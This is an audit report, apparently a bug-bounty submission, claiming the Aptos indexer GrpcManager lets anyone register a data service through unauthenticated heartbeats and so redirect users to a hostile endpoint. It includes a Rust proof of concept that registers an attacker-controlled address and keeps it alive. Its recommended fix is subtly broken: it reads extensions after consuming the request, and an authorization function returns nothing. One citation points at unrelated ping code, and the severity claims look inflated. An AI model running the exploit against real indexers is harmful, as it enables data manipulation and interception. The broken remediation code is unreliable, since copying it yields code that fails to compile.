# Audit Report

## Title
Unauthenticated Service Registration Enables Malicious Backend Routing in GrpcManager

## Summary
The GrpcManager's `get_data_service_for_request` handler can be exploited to route user requests to attacker-controlled backend services through unauthenticated service registration via the `heartbeat` endpoint. Any network attacker can register malicious service addresses without verification, causing legitimate indexer users to be routed to compromised endpoints.

## Finding Description

The vulnerability exists in the service registration mechanism where data services self-register with the GrpcManager through heartbeat messages. The critical flaw is the complete absence of authentication or address verification.

**Attack Flow:**

1. The `heartbeat` endpoint accepts `HeartbeatRequest` messages containing service information [1](#0-0) 

2. The `address` field from the request is directly trusted without validation [2](#0-1) 

3. Services are registered in the metadata manager based solely on self-claimed addresses [3](#0-2) 

4. When users call `get_data_service_for_request`, the handler selects from these unverified registered services [4](#0-3) 

5. Users are routed to attacker-controlled endpoints and receive manipulated blockchain data

**Exploitation Steps:**

1. Attacker crafts a `HeartbeatRequest` with `LiveDataServiceInfo` or `HistoricalDataServiceInfo`
2. Sets `service_info.address` to attacker's malicious gRPC endpoint
3. Sends request to GrpcManager (no authentication required)
4. Malicious service is registered and tracked as "healthy"
5. Legitimate users calling `get_data_service_for_request` may be load-balanced to the attacker's service
6. Attacker intercepts queries, serves false transaction data, or denies service

The registration persists until the service becomes "unreachable" (60-second timeout), during which users are actively routed to it. [5](#0-4) 

## Impact Explanation

**Severity: High to Critical (API Infrastructure Compromise)**

While the indexer infrastructure is separate from core consensus, this vulnerability enables:

1. **Data Integrity Violations**: Attackers serve manipulated transaction history, account states, or event logs to indexer clients (dApps, wallets, explorers)
2. **Widespread Application Impact**: Most Aptos ecosystem applications depend on indexer services for blockchain data access
3. **Supply Chain Attack Vector**: Compromised data feeds affect downstream services, analytics platforms, and user-facing applications
4. **Service Disruption**: Attackers can cause denial-of-service by registering then becoming unavailable
5. **Privacy Breach**: All user queries are exposed to the attacker (transaction lookups, account monitoring patterns)

This meets **High Severity** criteria per Aptos bug bounty (API crashes, significant protocol violations) and potentially **Critical** if considered infrastructure compromise enabling downstream attacks.

## Likelihood Explanation

**Likelihood: High**

- **Attacker Requirements**: Only network access to GrpcManager endpoint (no credentials needed)
- **Exploitation Complexity**: Trivial - single gRPC request with crafted service info
- **Detection Difficulty**: Malicious registrations blend with legitimate heartbeats
- **Attack Persistence**: Services remain registered for 60 seconds, renewable through periodic heartbeats
- **No Existing Mitigations**: Complete absence of authentication, authorization, or address verification

The attack is highly likely because the GrpcManager is designed to accept connections from any data service, and there's no infrastructure to distinguish legitimate from malicious registrations.

## Recommendation

Implement mutual TLS (mTLS) authentication and service address verification:

```rust
// In config.rs - Add authentication config
pub struct ServiceConfig {
    pub listen_address: SocketAddr,
    pub tls_config: Option<TlsConfig>,  // New field
    pub allowed_service_addresses: Vec<GrpcAddress>,  // Whitelist
}

pub struct TlsConfig {
    pub ca_cert_path: PathBuf,
    pub server_cert_path: PathBuf,
    pub server_key_path: PathBuf,
    pub require_client_cert: bool,
}

// In service.rs - Add address verification
async fn heartbeat(
    &self,
    request: Request<HeartbeatRequest>,
) -> Result<Response<HeartbeatResponse>, Status> {
    let request = request.into_inner();
    
    // Verify client certificate matches claimed address
    let peer_addr = request
        .extensions()
        .get::<tonic::transport::server::TcpConnectInfo>()
        .ok_or_else(|| Status::unauthenticated("No connection info"))?
        .remote_addr()
        .ok_or_else(|| Status::unauthenticated("No peer address"))?;
    
    if let Some(service_info) = request.service_info {
        if let Some(address) = service_info.address {
            // Verify address matches allowed list or peer certificate
            if !self.is_authorized_service(&address, &peer_addr) {
                return Err(Status::permission_denied("Unauthorized service address"));
            }
            
            if let Some(info) = service_info.info {
                return self
                    .handle_heartbeat(address, info)
                    .await
                    .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
            }
        }
    }
    
    Err(Status::invalid_argument("Bad request."))
}

// Add authorization check method
fn is_authorized_service(&self, claimed_address: &str, peer_addr: &SocketAddr) -> bool {
    // Option 1: Check against static whitelist
    // Option 2: Verify peer certificate CN matches claimed address
    // Option 3: Use token-based authentication
    // Implementation depends on deployment requirements
}
```

**Additional Mitigations:**

1. **Service Signing**: Require services to sign heartbeat messages with known keys
2. **Network Segmentation**: Deploy GrpcManager in private network, use VPN/tunnels for service connections
3. **Address Validation**: Verify claimed addresses are reachable and respond correctly before registration
4. **Rate Limiting**: Limit registration attempts per source IP/identity

## Proof of Concept

```rust
// exploit.rs - Demonstrates malicious service registration
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    LiveDataServiceInfo, ServiceInfo, HeartbeatRequest,
    service_info::Info, StreamInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to GrpcManager (no authentication required)
    let manager_endpoint = "http://legitimate-grpc-manager:50051";
    let mut client = GrpcManagerClient::connect(manager_endpoint).await?;
    
    // Craft malicious service registration
    let malicious_service_info = LiveDataServiceInfo {
        chain_id: 1, // Mainnet
        timestamp: Some(aptos_protos::util::timestamp::Timestamp {
            seconds: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)?
                .as_secs() as i64,
            nanos: 0,
        }),
        known_latest_version: Some(1000000),
        stream_info: Some(StreamInfo {
            active_streams: vec![],
        }),
        min_servable_version: Some(0),
    };
    
    let heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            // Attacker controls this address - no verification!
            address: Some("http://attacker-controlled-endpoint:50052".to_string()),
            info: Some(Info::LiveDataServiceInfo(malicious_service_info)),
        }),
    };
    
    // Send malicious registration - will be accepted without authentication
    let response = client.heartbeat(heartbeat).await?;
    println!("Malicious service registered successfully: {:?}", response);
    
    // Keep service "alive" by sending periodic heartbeats
    loop {
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        // Refresh registration...
    }
    
    Ok(())
}
```

When legitimate users now call `GetDataServiceForRequest`, they may be routed to `http://attacker-controlled-endpoint:50052` where the attacker can:
- Log all transaction queries (privacy breach)
- Serve manipulated blockchain data (integrity violation)  
- Selectively deny service (availability attack)
- Phish credentials from connected applications

**Notes:**

This vulnerability is specific to the **indexer gRPC infrastructure** layer, which provides read-only blockchain data access to applications. While it does not directly affect core consensus, validator operations, or on-chain state, it represents a critical infrastructure compromise that can impact the entire ecosystem of applications relying on indexer services for blockchain data. The absence of authentication on service registration endpoints violates basic security principles for service mesh architectures and enables trivial exploitation by any network attacker.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L217-248)
```rust
                for kv in &self.live_data_services {
                    let (address, live_data_service) = kv.pair();
                    let unreachable = live_data_service.recent_states.back().is_some_and(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(60),
                        )
                    });
                    if unreachable {
                        unreachable_live_data_services.push(address.clone());
                        continue;
                    }
                    let need_ping = live_data_service.recent_states.back().is_none_or(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(5),
                        )
                    });
                    if need_ping {
                        let address = address.clone();
                        let client = live_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) =
                                self.ping_live_data_service(address.clone(), client).await
                            {
                                warn!("Failed to ping live data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged live data service ({address}).");
                            }
                        });
                    }
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
